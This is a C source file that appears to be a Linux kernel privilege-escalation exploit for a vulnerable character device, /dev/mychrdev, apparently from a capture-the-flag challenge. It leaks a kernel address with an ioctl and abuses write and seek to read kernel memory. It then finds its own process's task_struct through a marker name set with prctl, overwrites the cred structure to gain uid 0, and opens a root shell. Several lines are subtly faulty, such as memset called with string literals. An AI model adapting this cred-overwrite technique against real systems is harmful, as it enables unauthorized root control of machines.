#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>

int fd;

void errpro(char* buf){
    printf("Error %s\n",buf);
    exit(-1);
}

int main(){
    fd = open("/dev/mychrdev",2);
    if(fd<0){
        errpro("Open dev");
    }
    
    char buffer[0x100] = { 0 };
    ioctl(fd, 4369, buffer);
    size_t mydata = *(size_t*)(buffer+0x20);
    printf("mydata: 0x%llx\n", mydata);

    char* buf = malloc(0x10100);
    memset(buf, "a", 0xf000);
    write(fd, buf, 0xf000);

    llseek(fd, 0, 0);

    write(fd, buf, 0xf000);

    printf("begin brute the creds addr\n");
    char target[16];
    strcpy(target, "FindCredsA1ex!!");
    prctl(PR_SET_NAME, target);
    size_t offset = 0;
    size_t addr0 = mydata-0xffff888000000000;
    size_t addr = addr0;
    size_t real_cred = 0;
    size_t cred = 0;
    int root_cred[12];
    int result = 0;
    size_t target_addr = 0;
    int num = 1;
    printf("addr: 0x%llx, offset:0x%llx\n",addr, offset);
    int cot = 0;
    for(;addr>offset; addr-=0x10000){
        memset(buf, "\x00",0x10000);
        llseek(fd, (addr+0x10000)*cot+0x10000+1, 0);
        num += 1;
        cot = 1;
        *(size_t*) buf = -(addr>>8);
        *(size_t*)(buf+8) = 0x10000000000000;
        
        write(fd, buf, 0x100);
        llseek(fd, 0 ,0);
        read(fd, buf, 0x10000);
        result = memmem(buf, 0x10000, target, 16);
        if(result)
        {
            printf("Get Result\n");
            cred = *(size_t*)(result-0x8);
            real_cred = *(size_t*)(result-0x10);
            printf("addr: %llx, result: %d cred:%llx, real_cred:%llx\n",(0xffff888000000000+addr0-addr),result,cred,real_cred);
            if((real_cred&0xffff000000000000) && real_cred){
                printf("result: %llx buf:0x%llx\n",result,(int)buf);
                target_addr = (addr0-addr + result - (int)(buf))+0xffff888000000000;
                printf("Found task_struct 0x%lx\n", target_addr);
                printf("Found cred: 0x%llx\n",real_cred);
                break;
            }
        }
    if(num%0x10==0)
        printf("change begin ptr %llx off:%llx num: %d addr:%llx\n",buf,(addr),num,(0xffff888000000000+addr0-addr));
    }
    if(result == 0){
        errpro("Not Found cred");
    }
    getchar();
    memset(buf, "\x00",0x300);
    size_t off = mydata - real_cred+0x100;
    llseek(fd, addr+0x10001, 0);
    *(size_t*)buf = -(off>>8);
    *(size_t*)(buf+8) = 0x10000000000000;
    write(fd, buf, 0x150);
    size_t off1 = real_cred&0xff;
    printf("llseek final %x\n",off1);
    llseek(fd, off1, 0);
    memset(buf,'\x00',0x100);
    write(fd, buf, 28);
    
    if(getuid() == 0){
        puts("Root now =====>");
        system("/bin/sh");
    }
    else{
        errpro("Not Root");
    }
    
    return 0;

}